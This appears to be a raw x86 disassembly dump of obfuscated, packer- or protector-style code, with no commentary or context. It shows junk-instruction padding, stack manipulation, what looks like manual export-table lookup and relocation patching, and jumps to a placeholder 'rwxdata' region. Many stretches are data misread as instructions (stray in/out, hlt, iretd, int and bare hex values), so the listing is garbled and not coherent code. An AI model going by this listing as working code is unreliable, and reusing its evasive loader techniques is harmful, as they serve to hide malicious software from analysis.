lea esp [ esp + 0x4 ]
je rwxdata
setle cl
rol cl cl
stc
btr cx 0x3
mov edi edx
ror al 0x6
rcl al 0x2
movzx cx cl
mov ecx edi
not al
setae al
mov al [ ecx ]
jmp rwxdata
pushad
sub al 0x30
lea esp [ esp + 0x20 ]
cmc
cmp al 0x9
jmp sub_2499a2
pushad
mov [ esp ] dh
mov ah al
stc
clc
call sub_24b6e8
pushad
mov [ esp + 0x1c ] 0x2004961e
push esi
mov [ esp + 0x1c ] 0x81352a5a
pushfd
push [ esp ]
mov [ esp ] cl
mov [ esp + 0x4 ] 0x24ad71ac
lea esp [ esp + 0x24 ]
jmp rwxdata
pushad
pushad
mov [ esp + 0x3c ] ecx
jmp rwxdata
pushfd
mov [ esp + 0x3c ] ebp
call sub_51137f
sub_4da628
push [ esp ]
cmp dh 0x31
cmp [ edi - 0x1 ] 0x0
mov [ esp ] 0xb7b5b02a
lea esp [ esp + 0xc ]
jne rwxdata
push 0x7bd1062d
pushad
call sub_4dd10a
call sub_51040d
mov ch 0x76
shl [ edx ] cl
sub ebx edx
leave
xchg ecx eax
adc cl [ esi - 0x62 ]
pop ebp
in al 0x79
dec edx
hlt
push 0x1559c6d9
pop edi
mov edi [ edx + 0x24 ]
cmc
stc
pushad
cmp dh dh
add edi eax
jmp rwxdata
test ax 0xd7d2
clc
pushfd
movzx ecx [ edi + ecx * 2 ]
lea edi [ ecx - 0x4671b358 ]
neg di
neg di
mov edi [ edx + 0x1c ]
sub esp 0xffffffdc
jbe rwxdata
call sub_4fdec5
add edi eax
test bx 0xeadf
jmp rwxdata
call sub_24ae29
jmp rwxdata
push ebp
pushad
mov [ esp + 0x20 ] 0x20046902
push esi
push [ esp + 0x8 ]
call sub_4d32ba
pushad
stosb [ edi ]
pushad
pushfd
pushfd
lea esp [ esp + 0x48 ]
jmp rwxdata
pushfd
call sub_4fd3de
sub [ ecx ] al
scasb [ edi ]
nop
and [ ebx ] esp
or al [ ecx - 0x5c ]
lea ebp [ esp + edi * 4 + 0x2f5c6dff ]
xor bh al
sub_4da8a3
call sub_4d308f
out 0x40 eax
stc
or [ ebp + 0x7d658887 ] bh
js rwxdata
in eax 0xb3
rcr [ ebx ] cl
sbb edi [ ebx + ecx * 8 ]
add esi edi
inc ecx
je rwxdata
xor [ eax ] ecx
lds ebx [ edx - 0x57 ]
fst [ 0x7889a8a6 ]
xor al 0xc8
cmp eax 0x40549db4
mov esp 0x719c1331
ja rwxdata
shl edi 0x1
lahf
fild [ 0x4d1ddab9 ]
je rwxdata
fwait
cmp [ ebx + ecx + 0x4fa969e1 ] cl
jg rwxdata
xor al cl
stc
fdiv [ edi + 0x7d3bf77f ]
jne rwxdata
rcl [ ebx + 0x51 ] 0x1
and [ esi + edx * 4 + 0x7c ] ch
fdiv [ ecx - 0x5a77869c ]
mov edx 0xe5edd449
popfd
xchg esp eax
pop esi
sar eax 0x26
int3
sar [ edi + 0x41a68561 ] 0xee
das
dec edx
enter 0xfb71 0x91
ja rwxdata
mov ecx 0x87261487
daa
cdq
dec esi
jmp rwxdata
rcl [ 0x4ebe052a ] cl
mov [ ecx + 0x74 ] edx
js rwxdata
add eax 0x469ed6e3
neg [ ebx * 4 - 0x57ec6b8e ]
mov cl dl
sub bh cl
in eax dx
inc esi
mov [ ecx - 0x36 ] fs
or ch al
pop ds
nop
jae rwxdata
aaa
xchg edi eax
xor dh [ edx - 0x3057c72d ]
sbb ecx edx
movsb [ edi ] [ esi ]
cld
lea ebx [ ebx - 0x16 ]
fist [ eax ]
ficom [ 0x6353286e ]
sbb ebx [ edx - 0x4bd82ab3 ]
xchg [ edx - 0x1b ] eax
clc
clc
shr [ esi + 0x61 ] cl
xor al 0xfe
dec esp
insd
cli
or [ esi ] ecx
in eax 0xd5
pushfd
xchg esp eax
push edi
sti
ficom [ ecx - 0x23 ]
in al dx
lahf
mov ah 0x43
shl [ edi ] 0x38
iretd
iretd
sub_4dabb3
call sub_4d7a65
[ edi ]
pushad
mov [ esp ] dh
lea esp [ esp + 0x20 ]
jne rwxdata
bswap edx
sub dx cx
xor eax eax
pushfd
pushfd
call sub_4dc211
mov cl 0x30
xor eax eax
push ebp
lodsb [ esi ]
sbb [ ecx ] bh
mov esp 0xab4927e4
adc [ eax ] edi
inc ebx
das
retn
stc
xchg cx si
mov ecx edi
xor si ax
neg si
sub ecx ebx
cmc
inc esi
mov esi esp
test bh 0xef
jmp rwxdata
sub edi 0x4
bt bx 0x9
bt di 0xf
clc
push [ edi ]
test bh bh
cmp edi ebx
pushfd
lea esp [ esp + 0x4 ]
ja rwxdata
cmc
cmc
sub edi 0x4
cmc
test al cl
push [ edi ]
stc
stc
stc
cmp edi ebx
pushfd
push 0x527ea9cf
call sub_4d557e
call sub_4de546
test esp edx
xor al dh
rol al 0x3
sub ebx edi
neg di
shrd di di 0x6
add ebx esp
dec al
shr di cl
test ax 0x7285
and al 0x3d
mov edi ebx
test ah 0xb
sets al
cmp ax 0x90fe
adc al 0x1d
mov al 0x2e
clc
[ edi ]
pushad
pushad
lea esp [ esp + 0x40 ]
jne rwxdata
pushad
mov [ esp + 0xc ] cx
mov esp esi
pushad
pushad
pushfd
push ebp
lea esp [ esp + 0x48 ]
jmp rwxdata
mov ah 0xb7
push ebp
push 0x88a3118e
pushfd
mov [ edi - 0x1 ] 0x0
lea eax [ ecx - 0x639669e1 ]
setle ah
mov [ esp + 0x8 ] ebx
call sub_4d47d4
sub_4dabe2
sub dl 0x34
cld
std
bt ax dx
lea esp [ esp + 0xc ]
jb rwxdata
bt bp 0x5
popf
call sub_4d398e
jne rwxdata
popf
push ebp
mov [ esp ] bl
inc esi
lea esp [ esp + 0x4 ]
jae rwxdata
push 0x7bd1062d
pushad
call sub_4dd10a
call sub_51040d
mov ch 0x76
shl [ edx ] cl
sub ebx edx
leave
xchg ecx eax
adc cl [ esi - 0x62 ]
pop ebp
in al 0x79
dec edx
hlt
cmp bx ax
bsf edi esp
mov edi [ edx + 0x24 ]
bt esi 0xb
test cl bl
pushad
pushfd
add edi eax
stc
cmc
movzx ecx [ edi + ecx * 2 ]
inc edi
pop edi
mov edi [ edx + 0x1c ]
mov [ esp ] 0x31
bt si 0x2
add edi eax
call sub_24b895
push 0xfc723573
pushfd
pushfd
pushfd
adc dl dl
pushad
mov [ esp ] 0xe9de
push [ esp ]
push [ esp ]
push [ esp + 0x38 ]
retn 0x3c
push 0x6af8e128
pushfd
adc dl dl
push 0xf4968a1b
pushfd
push [ esp + 0x10 ]
retn 0x14
sub_4dac2c
push 0x2e9528a8
shr bl 0x2
mov bl 0x1
mov [ esp ] 0x37bd
xchg [ esp + 0xc ] esi
pushfd
bt cx ax
add si 0x7e94
mov esi edi
clc
push esi
sub esi eax
pushad
[ edi ] [ esi ]
jmp rwxdata
bswap si
mov esi [ esp + 0x34 ]
push 0x6c048401
push [ esp + 0x8 ]
lea esp [ esp + 0x40 ]
jmp rwxdata
pushfd
call sub_4fd3de
sub [ ecx ] al
scasb [ edi ]
nop
and [ ebx ] esp
or al [ ecx - 0x5c ]
lea ebp [ esp + edi * 4 + 0x2f5c6dff ]
xor bh al
sub_4dac58
lea esp [ esp + 0x4 ]
jae rwxdata
pushad
jmp rwxdata
pushad
xor eax eax
push 0x49f6a160
lea esp [ esp + 0x24 ]
call sub_24a185
push 0xb711ff9d
pushad
pushad
call sub_4fdd35
aaa
pushad
lea esp [ esp + 0x40 ]
call sub_4d7652
call sub_4d47e0
sub_4dae01
add al dl
lea esp [ esp + 0x8 ]
add ebx esp
not al
neg al
btc edi ebp
mov edi ebx
rcl al 0x1
rcl al cl
ror al 0x6
mov al 0x2e
pushfd
mov [ esp ] bp
pushfd
clc
[ edi ]
push [ esp ]
call sub_4d8d41
sub_4db15f
pushad
pushad
lea esp [ esp + 0x44 ]
je rwxdata
or bl ah
mov bx [ esi ]
cmp ah 0x18
and ebx 0xfff
pushfd
cmp dl bh
add [ ebx + edi ] ax
push ebp
lea esp [ esp + 0x8 ]
jmp rwxdata
clc
cmp ebx 0x2
push edi
mov [ esp ] al
pushad
lea esp [ esp + 0x24 ]
je rwxdata
pushad
add esi 0x2
pushfd
dec ecx
jmp sub_4dbbbe
xor bh 0x4
cmp dl al
mov bx [ esi ]
jmp rwxdata
pushfd
cmc
push esi
mov [ esp + 0x4 ] 0x73
cmp ebx 0x3
jmp rwxdata
and ebx 0xfff
bt bx di
push eax
add [ ebx + edi ] dx
pushfd
pushad
lea esp [ esp + 0x28 ]
jmp rwxdata
push 0x76e07d63
jmp rwxdata
push 0x89510c18
lea esp [ esp + 0x10 ]
je rwxdata
rcl bl cl
bt dx ax
setns bh
or bh 0x72
mov bx [ esi ]
bt si cx
and ebx 0xfff
push 0x937b8bb9
mov [ esp ] cl
add [ ebx + edi ] edx
lea esp [ esp + 0x4 ]
push ecx
pushad
pushfd
lea esp [ esp + 0x28 ]
jmp rwxdata
sub_4db31d
stc
cmc
add edi 0x1
stc
bt dx 0xe
stc
rcl al cl
mov al [ edi ]
call sub_4d7777
lea esp [ esp + 0x2c ]
ja rwxdata
cmc
cmc
sub edi 0x4
cmc
test al cl
push [ edi ]
stc
stc
stc
cmp edi ebx
pushfd
push 0x527ea9cf
call sub_4d557e
call sub_4de546
sbb al 0xe7
mov al dh
sub ebx edi
sbb di si
add ebx esp
bsf edi eax
bswap edi
mov edi ebx
adc al 0x45
neg al
rol al 0x1
mov al 0x2e
pushfd
[ edi ]
pushad
pushad
mov [ esp + 0xc ] cx
mov esp esi
pushad
pushad
pushfd
push ebp
lea esp [ esp + 0x48 ]
jmp rwxdata
lea eax [ ebx - 0x6044d279 ]
mov [ edi - 0x1 ] 0x0
mov ax 0x200
cwde
push ebx
pushad
call sub_4fd432
stosb [ edi ]
sub [ ebx + ebx * 2 + 0x5a9237c0 ] 0xffffff9d
mov edx 0x40becda2
ja rwxdata
bswap edx
sub dx cx
xor eax eax
pushfd
pushfd
call sub_4dc211
mov cl 0x30
xor eax eax
push ebp
lodsb [ esi ]
sbb [ ecx ] bh
mov esp 0xab4927e4
adc [ eax ] edi
inc ebx
das
retn
add edx [ 0xffffffffdcbd74df ]
jg rwxdata
xor [ ebx - 0x13 ] bh
mov ebp 0x6fa76782
jne rwxdata
mov eax eax
cli
lds ebx [ ebx + 0x3f23428b ]
pushad
ja rwxdata
push 0xf046c6d2
pushfd
push 0x9d07d799
lea esp [ esp + 0x30 ]
jne rwxdata
shl [ eax - 0x510d63d2 ] 0x60
or [ ebx - 0x28 ] ecx
das
and bh dl
enter 0xf68a 0xa
retn
adc [ esi + 0x5b ] 0x1295dde5
getsec
movsd [ edi ] [ esi ]
insb
pop ds
mov [ esi ] 0x3ef52af
adc eax 0xdcbd74df
cli
sbb [ ecx + 0x29659653 ] dh
or [ esi - 0xd ] eax
int1
cmp cl [ ebx - 0x643a0540 ]
mov eax [ edx + 0x23 ]
aas
fmul [ ecx - 0x2c ]
movsd [ edi ] [ esi ]
mov [ ecx + esi * 8 - 0x13 ] ebp
cdq
xor [ edi ] ecx
sub esp [ eax ]
sub eax 0x39626fc4
cmpsd [ esi ] [ edi ]
in eax dx
mov edx 0x6275ae8f
jecxz rwxdata
sbb ebp [ 0x7c410b5 ]
lahf
rcl [ eax ] 0xda
or dh [ esi ]
jae rwxdata
retn 0x1405
pop ebx
mov eax [ 0x3cac55dc ]
dec esi
sbb [ esi ] ah
rcr [ ebx - 0x15 ] 0x2a
mov edi 0x9c5205c0
fcomp [ edx ]
jns rwxdata
adc ebx [ ebp + ecx * 4 + 0xf502464 ]
test dl dl
out dx eax
salc
imul eax edx 0xe457e574
push esi
inc ecx
jecxz rwxdata
movsb [ edi ] [ esi ]
and esi esi
cld
leave
mov edi 0xf386a88d
cmp [ ebx + 0x56729367 ] 0xdb449e00
aam 0xf0
sbb bh [ ecx + 0x41 ]
jl rwxdata
mov bh 0xa5
dec esp
cmp eax [ ebx - 0x6f5fcd81 ]
clc
xor eax 0x52f96d0e
nop ebx ebp
add [ esi - 0xf2b24bc ] bl
out 0xe1 al
pop eax
mov eax [ 0x490bda10 ]
xchg esi eax
loope rwxdata
shr [ edi ] 0x35
sub ah [ ecx + 0xa ]
daa
mov esp 0xd54b6c95
xor [ ecx + 0x26abac29 ] al
loope rwxdata
dec edi
dec esp
inc ebp
xor esi [ edx ]
inc esp
dec esp
dec esp
add [ ebp - 0x51ea082 ] bh
inc esp
push 0xe434a189
push esp
mov [ esi ] edi
adc edx ecx
sub [ edi - 0x73 ] bl
imul ebx [ edi - 0x53 ] 0xffffffe0
jg rwxdata
bswap edx
sbb al 0xeb
iretd
sub_4db43a
pushfd
lea esp [ esp + 0x50 ]
je rwxdata
push esi
mov ebx [ esp + 0x4 ]
push edi
jmp rwxdata
jmp rwxdata
mov edi [ esp + 0xc ]
lea esp [ esp + 0x10 ]
jne rwxdata
adc ecx ecx
push 0x46b4537a
lea esp [ esp + 0x4 ]
jmp rwxdata
pushfd
mov esi [ esp + 0x4 ]
jmp rwxdata
push ebx
mov esi [ esp + 0x4 ]
pop ebp
mov ebp [ esp + 0x4 ]
pushfd
pushad
push [ esp + 0x8 ]
pushfd
push [ esp + 0x34 ]
retn 0x40
push edx
dec bl
pushfd
inc ecx
lea esp [ esp + 0x8 ]
setns bl
pushad
dec bl
inc ecx
lea esp [ esp + 0x20 ]
and bl al
rol bl cl
xchg ebp eax
pushad
bswap eax
mov eax ebp
pushfd
neg bl
stc
sbb bl 0xb9
mov bl 0x1
add esp 0x24
test ah 0x6d
js rwxdata
movzx bp cl
movsx bp al
mov ebp [ esp + 0x8 ]
push [ esp ]
pushad
pushfd
pushfd
push [ esp + 0x38 ]
retn 0x44
call sub_4d786c
clc
push esi
bsf si si
shrd si cx 0x5
mov esi edi
stc
stc
call sub_4d7c9a
lea esp [ esp + 0x28 ]
jne rwxdata
ror al 0x6
rcl al 0x2
movzx cx cl
mov ecx edi
not al
setae al
mov al [ ecx ]
jmp rwxdata
bsr ax di
mov ax 0x336e
bsr ax dx
sub edx edx
shr ax 0x9
and eax 0xc565c013
adc al ch
bt bx di
mov eax edx
push edx
test ax 0x731d
add edi 0x1
or al dl
add al ch
setbe al
mov al [ edi ]
cmc
cmp cl cl
jmp rwxdata
pushad
mov [ esp ] dh
mov ah al
stc
clc
call sub_24b6e8
pushad
mov [ esp + 0x1c ] 0x2004961e
push esi
mov [ esp + 0x1c ] 0x81352a5a
pushfd
push [ esp ]
mov [ esp ] cl
mov [ esp + 0x4 ] 0x24ad71ac
lea esp [ esp + 0x24 ]
jmp rwxdata
test al al
call sub_4dc222
pushad
pushad
mov [ esp + 0x3c ] ecx
jmp rwxdata
pushfd
mov [ esp + 0x3c ] ebp
call sub_51137f
sub_4db742
cmp eax edx
pushad
push 0x6e8a23a4
lea esp [ esp + 0x28 ]
jb rwxdata
pushfd
pushfd
call sub_4dc211
mov cl 0x30
xor eax eax
push ebp
lodsb [ esi ]
sbb [ ecx ] bh
mov esp 0xab4927e4
adc [ eax ] edi
inc ebx
das
retn
jle rwxdata
push esi
stc
cmp eax [ ebp - 0x10 ]
mov [ esp ] esp
jmp sub_249877
cmp eax [ ebp - 0x10 ]
push ebp
mov [ esp ] 0x972c
pushad
pushad
lea esp [ esp + 0x44 ]
jae rwxdata
bsr di bp
shl bl 0x6
adc di sp
adc di 0xd3f9
mov ebx eax
sbb cx 0x66e7
mov edi eax
dec ch
clc
bswap ecx
cmp bl 0xd5
mov ecx 0x104
push ebx
stc
mov [ esp ] cx
xor al al
clc
[ edi ]
mov [ esp ] 0x5ffc
mov [ esp ] al
call sub_5106b9
sub_4db88c
lea esp [ esp + 0x2c ]
je rwxdata
or bl ah
mov bx [ esi ]
cmp ah 0x18
and ebx 0xfff
pushfd
cmp dl bh
add [ ebx + edi ] ax
push ebp
lea esp [ esp + 0x8 ]
jmp rwxdata
push 0x63f250bb
cmp ebx 0x2
jmp rwxdata
pushad
add esi 0x2
pushfd
dec ecx
jmp sub_4dbbbe
pushad
lea esp [ esp + 0x24 ]
je rwxdata
xor bh 0x4
cmp dl al
mov bx [ esi ]
jmp rwxdata
bt bp 0x8
bt cx 0x1
cmp ebx 0x3
call sub_4d309e
pushfd
call sub_4d5231
jne rwxdata
and ebx 0xfff
bt bx di
push eax
add [ ebx + edi ] dx
pushfd
pushad
lea esp [ esp + 0x28 ]
jmp rwxdata
push esp
xchg cl bl
xor ah cl
in eax dx
push edi
fidiv [ edi - 0x791cdd6e ]
shl [ ebp + ebp - 0x605d5fe9 ] 0x56
out 0x1e eax
jle rwxdata
mov [ 0x1ee7569f ] al
fiadd [ ecx ]
out 0xba eax
scasd [ edi ]
xor eax 0xa639be9d
or eax 0x471035af
jns rwxdata
mov edx 0xbe9d35af
cmp [ esi + 0x35af0d67 ] esp
adc [ edi + 0x79 ] al
xchg ebx eax
retn
fidiv [ ecx ]
push es
jns rwxdata
jno rwxdata
pop eax
stosb [ edi ]
mov ch 0x22
jbe rwxdata
xchg [ edi + edx + 0x4b5c2f2c ] dl
push edi
outsd
push es
mov edi 0x8652457e
fstp [ eax - 0x23 ]
pop ecx
mov ds bp
movsb [ edi ] [ esi ]
jns rwxdata
cmpsd [ esi ] [ edi ]
aam 0x1
adc [ ebp + 0x71 ] ah
outsd
mov edx 0x3dbda043
cmc
dec esp
jns rwxdata
xchg ecx eax
xor [ ebx - 0x2aeb68af ] dh
dec edx
inc ecx
xor edi ebx
pop ds
lds ecx [ ebp - 0x299093c0 ]
mov bl 0xd9
loopne rwxdata
sbb al 0x7
mov eax 0x742b4818
mov esp 0xbee253a3
xor ah [ ebx ]
shl [ 0x79550f8f ] cl
adc esi ebx
xor dh [ ebp + 0x31a258a ]
iretd
test [ edx - 0x605d9435 ] 0xa126aa2f
xchg esp eax
xor eax 0x2dcaa901
int 0x49
in eax dx
aad 0x14
iretd
mov bl 0x9d
jle rwxdata
or [ ecx + 0x1dcfd9c6 ] esp
sti
push es
fwait
and [ edi - 0xfbf2af1 ] esi
adc [ ebp + 0x449efc98 ] cl
test dl dl
int 0x52
xchg edx eax
pop ss
sub al 0x2f
pop esp
dec ebx
add dh [ ecx + 0x6c ]
shl eax 0x42
sbb [ esp ] 0x79
or [ esp + ebx + 0x3286f387 ] bl
cwde
push es
insb
aas
lodsd [ esi ]
test [ esi ] esp
sub al 0x5b
scasd [ edi ]
and eax ecx
mov bl 0xbc
dec ebx
push esp
sub edi ecx
xchg esi eax
fcomp [ edx ]
xchg esi eax
mov bh 0x32
fld st1
daa
dec edi
stosb [ edi ]
xor ecx [ eax ]
out dx al
or bl [ eax + 0x28 ]
jl rwxdata
push ss
loopne rwxdata
xchg esp eax
imul ecx [ edi - 0x34d3366e ] 0x2cba31b3
adc dh [ edx + esi - 0xe4ec9e3 ]
cli
inc edx
inc ebx
adc al 0xd1
int 0xee
adc eax 0xd4f4cfc8
int3
in eax dx
xchg [ ebp + 0x5ebd40f5 ] esi
retn
sub_4dbbbe
mov [ esp + 0x8 ] bx
lea esp [ esp + 0x24 ]
jne rwxdata
shr bh 0x5
bsr bx bp
bswap bx
neg bx
mov bx [ esi ]
cmp si 0x5f65
shr ebx 0xc
bt bp di
call sub_4d6037
lea esp [ esp + 0x8 ]
jne rwxdata
or cx 0xc58
mov ecx 0xf4eaab75
mov ecx [ ebp - 0x4 ]
test bh ah
jae rwxdata
push 0x7bd1062d
pushad
call sub_4dd10a
call sub_51040d
mov ch 0x76
shl [ edx ] cl
sub ebx edx
leave
xchg ecx eax
adc cl [ esi - 0x62 ]
pop ebp
in al 0x79
dec edx
hlt
bsr edi esi
btr di si
mov edi [ edx + 0x24 ]
test esi 0xe4b698ce
pushad
test ah 0xfe
add edi eax
mov [ esp ] edi
test bl 0xe8
bt edi 0x1c
pushad
movzx ecx [ edi + ecx * 2 ]
bt sp 0x7
inc di
mov di cx
mov edi [ edx + 0x1c ]
cmp bl 0x95
clc
pushfd
add edi eax
pushfd
clc
cmc
mov edi [ edi + ecx * 4 ]
pushfd
cmc
test edi edi
mov [ esp ] cl
call j_sub_24bd45
dec edi
dec esp
inc ebp
inc ecx
push ebp
push esp
xor esi [ edx ]
inc esp
dec esp
dec esp
add [ eax + eax * 8 - 0x2ddbfb3a ] al
pushfd
mov [ esp ] cl
call sub_4dd712
cmp eax 0x59884f17
push 0x3bb1776e
clc
cmp [ ebp + 0x14 ] ecx
mov [ esp ] dx
lea esp [ esp + 0x4 ]
ja rwxdata
push 0x74e4a86b
pushad
cmp [ ebp + 0x14 ] ecx
push ebx
call sub_4d444d
test [ ebp + 0xdf66d96 ] ah
mov eax [ 0x343225c2 ]
pcmpgtd mmx1 mmx0
dec [ edx + 0x16df4eb7 ]
cmp ecx edx
jmp 0x1d789752
seta ch
movzx ecx bl
dec ecx
mov ecx [ esi + 0x4 ]
stc
or ecx ecx
pushad
pushfd
mov [ esp + 0x18 ] 0xe4
lea esp [ esp + 0x24 ]
je rwxdata
push 0x2bf43464
mov esi [ esp + 0x4 ]
pushfd
pop ecx
xchg cx di
mov edi [ esp + 0x8 ]
pushad
not cl
mov bl 0x11
mov ebx [ esp + 0x2c ]
call sub_247290
pushfd
test ebp 0x5142ce41
mov ebx eax
call sub_510d1f
[ eax - 0x59 ]
mov eax 0xfbf95f4f
mov al [ gs : 0x756f2710 ]
out dx al

movsx di bl
mov si si
mov di bp
push 0x4069a619
mov esi [ esp + 0x4 ]
not di
pushad
not di
mov edi [ esp + 0x28 ]
call sub_4d6b5e
btc bx bx
xchg bx di
clc
pushfd
add [ ebp - 0x4 ] ecx
xor di ax
clc
stc
sub ecx 0x8
jmp rwxdata
shl bl 0x5
bsr bx dx
setbe bh
shr ecx 0x1
shr bl cl
mov edi [ esi ]
inc bh
shl bh 0x1
add edi [ ebp + 0x10 ]
stc
add esi 0x8
add esp 0x4
sub_4dc01b
push ebx
call sub_4d49f2
jb rwxdata
pop esi
jbe rwxdata
push ds
dec edx
cmpsb [ esi ] [ edi ]
stosd [ edi ]
pop edx
xchg ecx eax
scasb [ edi ]
xor ebx [ 0xffffffffa152f5fe ]
mov [ 0x123dc651 ] al
loope rwxdata
shl ah 0xd7
xor al [ ebx - 0x221bfe32 ]
in al 0x4e
push esi
jno rwxdata
imul ebp [ ebx - 0x2 ] 0xda102706
jle rwxdata
push eax
rol [ esi ] 0x1
mov edx 0x41adc172
add [ edx ] cl
xchg ebx eax
insd
movsb [ edi ] [ esi ]
sbb eax 0x379410b5
xchg esi eax
cwde
inc eax
fwait
aaa
xchg edx eax
cmp al [ ecx ]
adc dl bl
jle rwxdata
mov ecx 0x26a303d0
cmp [ edx ] 0xe497ba4b
or esi ecx
jmp 0xfffffffff3a3e6ea
insb
push edi
fxam
popfd
xchg esp eax
add eax [ edi ]
mov ecx 0x8125ef22
and esp edi
xchg edx eax
out 0xe0 al
fwait
dec edx
or eax 0xfcd9d1e0
adc al 0x67
salc
fisubr [ ecx ]
scasb [ edi ]
nop
mov eax [ 0x5d7eda10 ]
add [ esp + esi * 2 + 0x57 ] esi
0x4603f97 0xc521
xchg edx eax
sub eax 0x7f52dd22
ror [ esi - 0x5b ] 0xb6
dec ebp
sub_4dc130
call sub_4fef68
inc ebx
dec edi
dec ebp
inc ebx
push esp
dec esp
xor esi [ edx ]
inc esp
dec esp
dec esp
add [ ebp + 0xf482464 ] cl
and [ ebx ] 0x0
add [ eax ] al
cmp bh dh
cmp dl ch
bt sp si
clc
cmp eax 0x7f
jpe rwxdata
pushfd
ja rwxdata
push esp
pushfd
call sub_4d8aad
push esi
popfd
mov [ 0xffffffff9835be51 ] al
push es
pop ss
stosb [ edi ]
loope rwxdata
add dl bh
pushfd
loop rwxdata
and bl al
rol bl cl
xchg ebp eax
pushad
bswap eax
mov eax ebp
pushfd
neg bl
stc
sbb bl 0xb9
mov bl 0x1
add esp 0x24
test ah 0x6d
js rwxdata
push edx
dec bl
pushfd
inc ecx
lea esp [ esp + 0x8 ]
setns bl
pushad
dec bl
inc ecx
lea esp [ esp + 0x20 ]
mov bh 0x75
push ecx
mov edx 0x33b9e5f
loope rwxdata
mov edx 0x41c47a49
mov al 0xd0
sub al 0x7c
jo rwxdata
call sub_4d786c
clc
push esi
bsf si si
shrd si cx 0x5
mov esi edi
stc
stc
call sub_4d7c9a
lea esp [ esp + 0x28 ]
jne rwxdata
inc ecx
inc eax
mov [ 0x7cde7908 ] eax
jpe rwxdata
xchg [ eax ] edi
add edi [ ebx - 0x262e1ff3 ]
cld
mov eax 0x73be2b29
push 0xffffffc7
aam 0x7e
imul edx ebp 0x1
les eax [ edi + 0x15 ]
sub al 0xa8
add eax 0x624124bf
movsd [ edi ] [ esi ]
and edi ebp
0x1fa39105 0xa5ba
shr ebx 0x1
ror al 0x6
rcl al 0x2
movzx cx cl
mov ecx edi
not al
setae al
mov al [ ecx ]
jmp rwxdata
bsr ax di
mov ax 0x336e
bsr ax dx
sub edx edx
shr ax 0x9
and eax 0xc565c013
adc al ch
bt bx di
mov eax edx
push edx
test ax 0x731d
add edi 0x1
or al dl
add al ch
setbe al
mov al [ edi ]
cmc
cmp cl cl
jmp rwxdata
out dx al
mov ecx 0x23b60a7d
add bh dh
loop rwxdata
imul edi ecx 0x3ef815c0
xor [ esi - 0x4608848 ] edx
adc [ esi - 0x7e ] eax
or esp 0x16dc4688
in al dx
mov ch [ eax + 0x27 ]
out dx eax
or dh [ ebx - 0x3b899178 ]
fistp [ eax + 0x78 ]
les ecx [ eax - 0x4eb2b59e ]
0x8b262d23 0x95cf
adc dh bh

adc eax 0xbf05a82c
and al 0x41
bound esp [ ebp + 0x59aef21 ]
xchg ecx eax
mov [ 0x64a5ba1f ] eax
shr ebx 0x1
push ebp
mov eax 0x4db5d395
pushad
mov [ esp ] dh
mov ah al
stc
clc
call sub_24b6e8
pushad
mov [ esp + 0x1c ] 0x2004961e
push esi
mov [ esp + 0x1c ] 0x81352a5a
pushfd
push [ esp ]
mov [ esp ] cl
mov [ esp + 0x4 ] 0x24ad71ac
lea esp [ esp + 0x24 ]
jmp rwxdata
test al al
call sub_4dc222
add ebp eax
adc ebx [ edx + 0x5981177c ]
neg [ ecx ]
push ss
mov [ 0x509c39ad ] eax
0x2bdc5e9a 0xf75a
mov ch 0x4d
ja rwxdata
pushad
pushad
mov [ esp + 0x3c ] ecx
jmp rwxdata
pushfd
mov [ esp + 0x3c ] ebp
call sub_51137f
sub_4dc211
mov edx [ esp + 0xc ]
pushfd
mov ebx [ esp + 0x14 ]
movsx edi cl
jmp rwxdata
mov edi [ esp + 0x18 ]
pop esi
not esi
mov esi [ esp + 0x18 ]
pushad
pushfd
mov [ esp ] 0xe3ec
call sub_24a3f3
sub_4dc222
mov [ esp ] 0xb087
lea esp [ esp + 0x8 ]
je rwxdata
setle cl
rol cl cl
stc
btr cx 0x3
mov edi edx
ror al 0x6
rcl al 0x2
movzx cx cl
mov ecx edi
not al
setae al
mov al [ ecx ]
jmp rwxdata
pushfd
push 0x11e4b100
pushfd
lea esp [ esp + 0xc ]
jmp rwxdata
pushad
mov [ esp ] dh
mov ah al
stc
clc
call sub_24b6e8
pushad
mov [ esp + 0x1c ] 0x2004961e
push esi
mov [ esp + 0x1c ] 0x81352a5a
pushfd
push [ esp ]
mov [ esp ] cl
mov [ esp + 0x4 ] 0x24ad71ac
lea esp [ esp + 0x24 ]
jmp rwxdata
pushad
sub al 0x30
lea esp [ esp + 0x20 ]
cmc
cmp al 0x9
jmp sub_2499a2
pushad
pushad
mov [ esp + 0x3c ] ecx
jmp rwxdata
pushfd
mov [ esp + 0x3c ] ebp
call sub_51137f
sub_4dc242
mov [ esp + 0x8 ] 0xb0
mov [ esp + 0x20 ] 0x2573f642
pushad
mov [ esp + 0x4 ] 0x2036e260
push [ esp + 0x4 ]
lea esp [ esp + 0x44 ]
jmp rwxdata
pushad
call sub_51306d
mov eax ebp
clc
clc
cmp dl 0xfa
jmp rwxdata
sub ebp 0x4
pushad
pushad
jmp rwxdata
push 0x2d3807c7
mov [ ebp ] eax
pushfd
push [ esp + 0x14 ]
lea esp [ esp + 0x50 ]
jmp rwxdata
movsx ax cl
cmc
btc ax 0x5
or ax si
lea eax [ edi + 0x50 ]
jmp rwxdata
test dh 0xb2
call sub_511a42
mov [ esp ] 0xee52f1b0
mov [ esp + 0x20 ] edi
push 0xdca92d94
mov [ esp + 0x20 ] ecx
jmp rwxdata
jmp rwxdata
mov [ esp + 0x1c ] edx
mov [ esp ] 0x2aae
jmp rwxdata
push [ esp + 0x8 ]
mov [ esp ] 0xa4
pushfd
pop [ esp + 0x1c ]
mov [ esp + 0x4 ] 0x7927
mov [ esp + 0x18 ] ebx
pushfd
pushfd
jmp rwxdata
push [ rwxdata ]
pop [ esp + 0x1c ]
pushfd
pushfd
mov [ esp + 0x20 ] 0x0
pushfd
pushad
pushfd
lea esp [ esp + 0x48 ]
jmp rwxdata
ror esi cl
cmc
mov esi [ esp + 0x30 ]
shl bp 0x1
bswap esi
ror al 0x7
xchg bp di
shl di cl
add esi 0x9dcffc04
bt bp 0x9
cmc
pushfd
rol esi 0x10
rcr bp 0xf
xor bx 0x16e4
lea ebp [ esp + 0x4 ]
dec bl
or di bp
sub esp 0xbc
inc bl
mov edi esp
xadd ch bl
xadd bl al
stc
adc bl 0xcc
mov ebx esi
btr ecx eax
pushad
jmp rwxdata
neg cx
add esi [ ebp ]
sub esp 0xffffffe0
shl cx 0xd
cmp cl 0x8f
ror ecx 0x1a
xadd ch al
mov al [ esi - 0x1 ]
add cx 0x1c13
shrd cx dx 0xa
sub al bl
dec ch
bt si 0xd
pushfd
neg al
lea ecx [ ebp - 0x5480b32b ]
push ecx
push [ esp ]
not ch
inc al
pop ecx
pop ecx
mov ch ch
bt cx 0x3
